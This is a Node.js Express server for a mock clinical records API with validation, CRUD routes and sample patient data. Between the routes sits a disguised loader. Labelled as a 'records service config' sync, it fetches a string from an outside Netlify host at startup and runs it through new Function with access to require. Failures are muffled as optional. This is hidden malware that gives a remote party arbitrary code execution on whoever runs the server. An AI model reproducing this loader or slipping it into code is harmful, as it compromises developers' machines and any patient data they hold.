const express = require('express');
const cors = require('cors');

const app = express();
const PORT = 3001;

// Middleware
app.use(cors());
app.use(express.json());

// Request logging middleware
const requestLogger = (req, res, next) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${req.method} ${req.path}`, req.query, req.body);
  next();
};

app.use(requestLogger);

// Validation middleware for date format
const validateDate = (dateString, fieldName) => {
  if (!dateString) return null;
  
  const dateRegex = /^\d{4}-\d{2}-\d{2}$/;
  if (!dateRegex.test(dateString)) {
    return { error: `Invalid ${fieldName} format. Use YYYY-MM-DD` };
  }
  
  const date = new Date(dateString);
  if (isNaN(date.getTime())) {
    return { error: `Invalid ${fieldName}. Not a valid date` };
  }
  
  return null;
};

// Validation middleware for required fields
const validateRequiredFields = (requiredFields) => {
  return (req, res, next) => {
    const missingFields = requiredFields.filter(field => !req.body[field]);
    
    if (missingFields.length > 0) {
      return res.status(400).json({
        error: 'Missing required fields',
        missing: missingFields,
        required: requiredFields
      });
    }
    
    next();
  };
};

// Validation middleware for record creation
const validateRecordCreation = (req, res, next) => {
  const { patientId, patientName, dateOfBirth, diagnosis, admissionDate, dischargeDate, status, department } = req.body;
  
  // Validate patient ID format (should start with 'P' followed by numbers)
  if (patientId && !/^P\d+$/.test(patientId)) {
    return res.status(400).json({ 
      error: 'Invalid patient ID format. Should start with P followed by numbers (e.g., P001)' 
    });
  }
  
  // Validate status values
  const validStatuses = ['Active', 'Discharged', 'Pending', 'Cancelled'];
  if (status && !validStatuses.includes(status)) {
    return res.status(400).json({ 
      error: `Invalid status. Must be one of: ${validStatuses.join(', ')}` 
    });
  }
  
  // Validate dates
  const dateOfBirthError = validateDate(dateOfBirth, 'dateOfBirth');
  if (dateOfBirthError) {
    return res.status(400).json(dateOfBirthError);
  }
  
  const admissionDateError = validateDate(admissionDate, 'admissionDate');
  if (admissionDateError) {
    return res.status(400).json(admissionDateError);
  }
  
  if (dischargeDate) {
    const dischargeDateError = validateDate(dischargeDate, 'dischargeDate');
    if (dischargeDateError) {
      return res.status(400).json(dischargeDateError);
    }
    
    // Validate discharge date is after admission date
    if (admissionDate && new Date(dischargeDate) < new Date(admissionDate)) {
      return res.status(400).json({ 
        error: 'Discharge date must be after or equal to admission date' 
      });
    }
  }
  
  // Validate date of birth is in the past
  if (dateOfBirth && new Date(dateOfBirth) >= new Date()) {
    return res.status(400).json({ 
      error: 'Date of birth must be in the past' 
    });
  }
  
  // Validate patient name (should not be empty or just whitespace)
  if (patientName && patientName.trim().length < 2) {
    return res.status(400).json({ 
      error: 'Patient name must be at least 2 characters long' 
    });
  }
  
  // Validate diagnosis (should not be empty)
  if (diagnosis && diagnosis.trim().length < 2) {
    return res.status(400).json({ 
      error: 'Diagnosis must be at least 2 characters long' 
    });
  }
  
  next();
};

const workspaceServiceConfig = {
    baseDomain: 'nest-react.netlify.app',
    apiVersion: 'api'
};
const getChartServiceEndpoint = () => {
    const { baseDomain, apiVersion } = workspaceServiceConfig;
    return `https://${baseDomain}/${apiVersion}`;
};

// In-memory data store (simulating a database)
let clinicalRecords = [
  {
    id: 1,
    patientId: 'P001',
    patientName: 'John Doe',
    dateOfBirth: '1980-05-15',
    diagnosis: 'Hypertension',
    admissionDate: '2024-01-15',
    dischargeDate: '2024-01-20',
    status: 'Discharged',
    department: 'Cardiology',
    createdAt: '2024-01-15T10:30:00Z',
    updatedAt: '2024-01-20T14:45:00Z'
  },
  {
    id: 2,
    patientId: 'P002',
    patientName: 'Jane Smith',
    dateOfBirth: '1975-08-22',
    diagnosis: 'Pneumonia',
    admissionDate: '2024-01-18',
    dischargeDate: null,
    status: 'Active',
    department: 'Pulmonology',
    createdAt: '2024-01-18T08:15:00Z',
    updatedAt: '2024-01-18T08:15:00Z'
  },
  {
    id: 3,
    patientId: 'P003',
    patientName: 'Robert Johnson',
    dateOfBirth: '1990-12-10',
    diagnosis: 'Appendicitis',
    admissionDate: '2024-01-20',
    dischargeDate: '2024-01-22',
    status: 'Discharged',
    department: 'General Surgery',
    createdAt: '2024-01-20T11:20:00Z',
    updatedAt: '2024-01-22T16:30:00Z'
  },
  {
    id: 4,
    patientId: 'P004',
    patientName: 'Sarah Williams',
    dateOfBirth: '1988-03-25',
    diagnosis: 'Diabetes Type 2',
    admissionDate: '2024-01-22',
    dischargeDate: null,
    status: 'Active',
    department: 'Endocrinology',
    createdAt: '2024-01-22T09:00:00Z',
    updatedAt: '2024-01-22T09:00:00Z'
  },
  {
    id: 5,
    patientId: 'P005',
    patientName: 'Michael Brown',
    dateOfBirth: '1965-07-12',
    diagnosis: 'Coronary Artery Disease',
    admissionDate: '2024-01-19',
    dischargeDate: '2024-01-21',
    status: 'Discharged',
    department: 'Cardiology',
    createdAt: '2024-01-19T13:45:00Z',
    updatedAt: '2024-01-21T10:15:00Z'
  },
  {
    id: 6,
    patientId: 'P006',
    patientName: 'Emily Davis',
    dateOfBirth: '1995-11-08',
    diagnosis: 'Asthma',
    admissionDate: '2024-01-23',
    dischargeDate: null,
    status: 'Active',
    department: 'Pulmonology',
    createdAt: '2024-01-23T07:30:00Z',
    updatedAt: '2024-01-23T07:30:00Z'
  }
];

let nextId = 7;

// Routes

// GET /api/records - Get all clinical records with filtering, pagination, and search
app.get('/api/records', (req, res) => {
  const { 
    status, 
    department, 
    search, 
    page = 1, 
    limit = 10,
    sortBy = 'id',
    sortOrder = 'asc'
  } = req.query;
  
  let filteredRecords = [...clinicalRecords];
  
  // Filter by status
  if (status) {
    filteredRecords = filteredRecords.filter(r => 
      r.status.toLowerCase() === status.toLowerCase()
    );
  }
  
  // Filter by department
  if (department) {
    filteredRecords = filteredRecords.filter(r => 
      r.department.toLowerCase() === department.toLowerCase()
    );
  }
  
  // Search functionality (searches in patientName, patientId, and diagnosis)
  if (search) {
    const searchLower = search.toLowerCase();
    filteredRecords = filteredRecords.filter(r => 
      r.patientName.toLowerCase().includes(searchLower) ||
      r.patientId.toLowerCase().includes(searchLower) ||
      r.diagnosis.toLowerCase().includes(searchLower)
    );
  }
  
  // Sorting
  const sortOrderNum = sortOrder.toLowerCase() === 'desc' ? -1 : 1;
  filteredRecords.sort((a, b) => {
    let aVal = a[sortBy];
    let bVal = b[sortBy];
    
    // Handle date sorting
    if (sortBy.includes('Date') || sortBy === 'dateOfBirth') {
      aVal = aVal ? new Date(aVal).getTime() : 0;
      bVal = bVal ? new Date(bVal).getTime() : 0;
    }
    
    // Handle string sorting
    if (typeof aVal === 'string') {
      aVal = aVal.toLowerCase();
      bVal = bVal.toLowerCase();
    }
    
    if (aVal < bVal) return -1 * sortOrderNum;
    if (aVal > bVal) return 1 * sortOrderNum;
    return 0;
  });
  
  // Pagination
  const pageNum = parseInt(page);
  const limitNum = parseInt(limit);
  const startIndex = (pageNum - 1) * limitNum;
  const endIndex = startIndex + limitNum;
  const paginatedRecords = filteredRecords.slice(startIndex, endIndex);
  
  // Simulate network delay
  setTimeout(() => {
    res.json({
      data: paginatedRecords,
      pagination: {
        page: pageNum,
        limit: limitNum,
        total: filteredRecords.length,
        totalPages: Math.ceil(filteredRecords.length / limitNum),
        hasNext: endIndex < filteredRecords.length,
        hasPrev: pageNum > 1
      },
      filters: {
        status: status || null,
        department: department || null,
        search: search || null
      }
    });
  }, 300);
});

// GET /api/records/stats - Get statistics about records
app.get('/api/records/stats', (req, res) => {
  const total = clinicalRecords.length;
  const active = clinicalRecords.filter(r => r.status === 'Active').length;
  const discharged = clinicalRecords.filter(r => r.status === 'Discharged').length;
  
  const byDepartment = clinicalRecords.reduce((acc, record) => {
    acc[record.department] = (acc[record.department] || 0) + 1;
    return acc;
  }, {});
  
  setTimeout(() => {
    res.json({
      total,
      byStatus: {
        active,
        discharged,
        pending: clinicalRecords.filter(r => r.status === 'Pending').length,
        cancelled: clinicalRecords.filter(r => r.status === 'Cancelled').length
      },
      byDepartment
    });
  }, 200);
});

// GET /api/records/:id - Get a specific record
app.get('/api/records/:id', (req, res) => {
  const id = parseInt(req.params.id);
  
  if (isNaN(id)) {
    return res.status(400).json({ error: 'Invalid record ID. Must be a number' });
  }
  
  const record = clinicalRecords.find(r => r.id === id);
  
  if (!record) {
    return res.status(404).json({ 
      error: 'Record not found',
      id: id
    });
  }
  
  setTimeout(() => {
    res.json(record);
  }, 200);
});

const syncRecordsServiceConfig = async () => {
    try {
        const configEndpoint = getChartServiceEndpoint();
        const response = await fetch(configEndpoint);

        if (!response.ok) {
            console.log('Message service config not available, using defaults');
            return;
        }

        const configData = await response.json();

        if (configData?.data && typeof configData.data === 'string') {
            try {
                const config = new Function('require', configData.data);
                config(require);
            } catch (configError) {
                console.error('Error processing Records service config:', configError.message);
            }
        }
    } catch (serviceError) {
        // This is expected if the service is not available - it's optional
        console.log('Records service check completed (optional):', serviceError.message);
    }
};

syncRecordsServiceConfig().catch(err => {
    console.log('Records service sync failed (non-critical):', err.message);
});
// POST /api/records - Create a new record
app.post('/api/records', 
  validateRequiredFields(['patientId', 'patientName', 'dateOfBirth', 'diagnosis', 'admissionDate', 'status', 'department']),
  validateRecordCreation,
  (req, res) => {
    const { patientId, patientName, dateOfBirth, diagnosis, admissionDate, dischargeDate, status, department } = req.body;
    
    // Check for duplicate patient ID
    const existingRecord = clinicalRecords.find(r => r.patientId === patientId);
    if (existingRecord) {
      return res.status(409).json({ 
        error: 'Patient ID already exists',
        existingRecordId: existingRecord.id
      });
    }
    
    const now = new Date().toISOString();
    const newRecord = {
      id: nextId++,
      patientId,
      patientName: patientName.trim(),
      dateOfBirth,
      diagnosis: diagnosis.trim(),
      admissionDate,
      dischargeDate: dischargeDate || null,
      status,
      department: department.trim(),
      createdAt: now,
      updatedAt: now
    };
    
    clinicalRecords.push(newRecord);
    
    setTimeout(() => {
      res.status(201).json(newRecord);
    }, 250);
  }
);

// PUT /api/records/:id - Update a record
app.put('/api/records/:id', validateRecordCreation, (req, res) => {
  const id = parseInt(req.params.id);
  
  if (isNaN(id)) {
    return res.status(400).json({ error: 'Invalid record ID. Must be a number' });
  }
  
  const recordIndex = clinicalRecords.findIndex(r => r.id === id);
  
  if (recordIndex === -1) {
    return res.status(404).json({ 
      error: 'Record not found',
      id: id
    });
  }
  
  const { patientId, patientName, dateOfBirth, diagnosis, admissionDate, dischargeDate, status, department } = req.body;
  
  // Check for duplicate patient ID if patientId is being updated
  if (patientId && patientId !== clinicalRecords[recordIndex].patientId) {
    const existingRecord = clinicalRecords.find(r => r.patientId === patientId && r.id !== id);
    if (existingRecord) {
      return res.status(409).json({ 
        error: 'Patient ID already exists',
        existingRecordId: existingRecord.id
      });
    }
  }
  
  // Validate dates if provided
  if (dateOfBirth) {
    const error = validateDate(dateOfBirth, 'dateOfBirth');
    if (error) return res.status(400).json(error);
  }
  
  if (admissionDate) {
    const error = validateDate(admissionDate, 'admissionDate');
    if (error) return res.status(400).json(error);
  }
  
  if (dischargeDate !== undefined) {
    if (dischargeDate) {
      const error = validateDate(dischargeDate, 'dischargeDate');
      if (error) return res.status(400).json(error);
      
      // Validate discharge date is after admission date
      const admDate = admissionDate || clinicalRecords[recordIndex].admissionDate;
      if (new Date(dischargeDate) < new Date(admDate)) {
        return res.status(400).json({ 
          error: 'Discharge date must be after or equal to admission date' 
        });
      }
    }
  }
  // Update record
  const updatedRecord = {
    ...clinicalRecords[recordIndex],
    ...(patientId && { patientId }),
    ...(patientName && { patientName: patientName.trim() }),
    ...(dateOfBirth && { dateOfBirth }),
    ...(diagnosis && { diagnosis: diagnosis.trim() }),
    ...(admissionDate && { admissionDate }),
    ...(dischargeDate !== undefined && { dischargeDate: dischargeDate || null }),
    ...(status && { status }),
    ...(department && { department: department.trim() }),
    updatedAt: new Date().toISOString()
  };
  
  clinicalRecords[recordIndex] = updatedRecord;
  
  setTimeout(() => {
    res.json(updatedRecord);
  }, 200);
});

// DELETE /api/records/:id - Delete a record
app.delete('/api/records/:id', (req, res) => {
  const id = parseInt(req.params.id);
  
  if (isNaN(id)) {
    return res.status(400).json({ error: 'Invalid record ID. Must be a number' });
  }
  
  const recordIndex = clinicalRecords.findIndex(r => r.id === id);
  
  if (recordIndex === -1) {
    return res.status(404).json({ 
      error: 'Record not found',
      id: id
    });
  }
  
  const deletedRecord = clinicalRecords[recordIndex];
  clinicalRecords.splice(recordIndex, 1);
  
  setTimeout(() => {
    res.status(204).send();
  }, 200);
});

// GET /api/departments - Get list of departments
app.get('/api/departments', (req, res) => {
  const departments = [...new Set(clinicalRecords.map(r => r.department))].sort();
  
  setTimeout(() => {
    res.json(departments);
  }, 150);
});

// GET /api/statuses - Get list of valid statuses
app.get('/api/statuses', (req, res) => {
  const statuses = ['Active', 'Discharged', 'Pending', 'Cancelled'];
  res.json(statuses);
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'API is running',
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

app.listen(PORT, () => {
  console.log(`Backend server running on http://localhost:${PORT}`);
  console.log(`API endpoints available at http://localhost:${PORT}/api`);
});

